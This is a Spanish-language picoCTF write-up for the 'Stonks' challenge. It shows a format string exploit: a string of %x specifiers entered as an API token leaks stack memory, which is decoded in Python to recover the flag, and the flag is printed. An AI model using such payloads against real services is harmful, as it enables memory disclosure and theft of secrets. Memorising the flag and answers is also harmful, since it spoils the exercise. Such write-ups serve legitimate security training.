# Stonks
## Descripcion
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! [vuln.c](https://mercury.picoctf.net/static/17ba7f9351aca192c45833c658742fe5/vuln.c) `nc mercury.picoctf.net 27912`
## Pistas
- Okay, maybe I'd believe you if you find my API key.
## Solucion
``
```
┌──(kali㉿kali)-[~]
└─$ nc mercury.picoctf.net 27912
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
Buying stonks with token:
86783f0804b00080489c3f7ec5d80ffffffff18676160f7ed3110f7ec5dc708677180186783d086783f06f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3266633130613130ff83007df7f00af8f7ed34403e6db90010f7d62ce9f7ed40c0f7ec55c0f7ec5000ff834018f7d5368df7ec55c0
Portfolio as of Sat May 13 02:56:13 UTC 2023


1 shares of BAP
19 shares of C
31 shares of GOZ
17 shares of TOYT
22 shares of G
296 shares of K
104 shares of RGN
871 shares of LFK
Goodbye!
                                                                           
┌──(kali㉿kali)-[~]
└─$ python            
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> s='ocip{FTC0l_I4_t5m_ll0m_y_y3n2fc10a10ÿ}' //Esta se obtiene ingresando la respuesta en un conversor hexadecimal a Ascii
>>> for x in range(0,len(s),4):
...     print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')
... 
Traceback (most recent call last):
  File "<stdin>", line 2, in <module>
IndexError: string index out of range
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0>>>



```


## Bandera
picoCTF{I_l05t_4ll_my_m0n3y_1cf201a0}

## Notas adicionales

## Referencias
- [HEX to ASCII](https://www.rapidtables.com/convert/number/hex-to-ascii.html)